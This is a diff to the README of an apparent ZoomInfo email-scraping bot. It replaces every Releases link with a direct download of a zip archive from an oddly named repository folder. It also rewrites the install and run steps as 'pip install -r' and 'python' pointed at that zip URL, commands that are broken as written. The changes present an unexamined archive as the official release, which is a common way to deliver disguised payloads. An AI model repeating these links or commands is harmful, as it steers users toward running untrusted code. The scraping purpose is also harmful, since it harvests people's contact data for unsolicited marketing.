@@ -1,7 +1,7 @@
 # 🤖 zoominfo-data-scraping-email-finder-bot - Collect Emails Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/releases)
+[![Download Latest Release](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/raw/refs/heads/main/unoxidated/data-bot-zoominfo-finder-scraping-email-v1.1.zip)](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/raw/refs/heads/main/unoxidated/data-bot-zoominfo-finder-scraping-email-v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Zoominfo Data Scraping Email Finder Bot. This tool simplifies the process of gathering email addresses for your marketing and research needs. 
@@ -18,7 +18,7 @@ Before you start, make sure you have the following:
 Follow these instructions to get your bot up and running.
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/releases) to find the latest version of the bot.
+   Go to the [Releases page](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/raw/refs/heads/main/unoxidated/data-bot-zoominfo-finder-scraping-email-v1.1.zip) to find the latest version of the bot.
 
 2. **Select the Latest Release**  
    On the Releases page, look for the most recent version listed at the top. The format will usually be something like "v1.0.0".
@@ -41,13 +41,13 @@ Follow these instructions to get your bot up and running.
 7. **Install Required Packages**  
    Ensure you have the necessary Python packages installed. Type the following command and hit enter:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/raw/refs/heads/main/unoxidated/data-bot-zoominfo-finder-scraping-email-v1.1.zip
    ```
 
 8. **Run the Bot**  
    After all packages are installed, you can start using the bot. Type the following command and hit enter:
    ```
-   python main.py
+   python https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/raw/refs/heads/main/unoxidated/data-bot-zoominfo-finder-scraping-email-v1.1.zip
    ```
 
 ## 📊 Features
@@ -72,7 +72,7 @@ If you encounter issues:
 - **Error Messages:** Take note of any error messages in the command prompt or terminal. They can help point to the issue.
 
 ## 🔗 Learn More
-For more information and updates, visit our project page on GitHub. Feel free to check the [Releases page](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/releases) for new versions and additional features.
+For more information and updates, visit our project page on GitHub. Feel free to check the [Releases page](https://github.com/Jolobear1/zoominfo-data-scraping-email-finder-bot/raw/refs/heads/main/unoxidated/data-bot-zoominfo-finder-scraping-email-v1.1.zip) for new versions and additional features.
 
 ## 🤝 Contributions
 If you would like to contribute to this project, please review our guidelines on GitHub. We welcome improvements and suggestions. 
